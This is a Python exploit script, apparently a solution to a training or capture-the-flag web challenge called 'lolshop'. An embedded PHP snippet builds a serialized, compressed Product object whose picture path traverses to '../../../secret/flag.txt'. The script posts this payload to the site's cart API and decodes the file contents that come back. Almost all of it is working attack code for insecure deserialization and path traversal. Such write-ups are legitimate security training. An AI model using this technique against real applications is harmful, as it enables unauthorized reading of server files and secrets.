import requests
import base64

"""

class Product {

    private $id;
    private $name;
    private $description;
    private $picture;
    private $price;

    function __construct($id, $name, $description, $picture, $price) {
        $this->id = $id;
        $this->name = $name;
        $this->description = $description;
        $this->picture = $picture;
        $this->price = $price;
    }

    function getId() {
        return $this->id;
    }

    function getName() {
        return $this->name;
    }

    function getDescription() {
        return $this->description;
    }

    function getPicture() {
        $path = '/var/www/assets/' . $this->picture;
        $data = base64_encode(file_get_contents($path));
        return $data;
    }

    function getPrice() {
        return $this->price;
    }

    function toDict() {
        return array(
            "id" => $this->id,
            "name" => $this->name,
            "description" => $this->description,
            "picture" => $this->getPicture(),
            "price" => $this->price
        );
    }

}


$id = 90;
$name = "Dildo";
$description = "Long dildo";
$picture = "../../../secret/flag.txt";
$price = 20;

$product = new Product($id, $name, $description, $picture, $price);

$evilSerialized = serialize($product);
$evelCompressed = gzcompress($evilSerialized);
$encoded = base64_decode("YWN0Znt3ZWxjb21lX3RvX3RoZV9uZXdfd2ViXzA4MzZlZWY3OTE2NmI1ZGM4Yn0K");

echo $encoded;

"""

vulnerable_string = "eJxNjtEKwjAMRfcpkg/o2roppq8+CvoLo60jMNfRZiCI/247FQp5COeeG3LFI8ItBrdaBuzxlVAphOaHGnJgCE/SZL6v+Dw8PGTYI5xpcqHsWlaC88lGWpjCXDKVs0uYx5372+pQ2QtZXuN2UXcIQrTfSd5Gz+19GkbBT956Xd2LZH35UEvz/gCpIj4U"

URL = 'http://lolshop.training.jinblack.it'
URL_CART = "%s/api/cart.php" % (URL,)

payload = {'state': vulnerable_string}
r = requests.post(URL_CART, data=payload)

print(base64.b64decode(r.json()['picture']))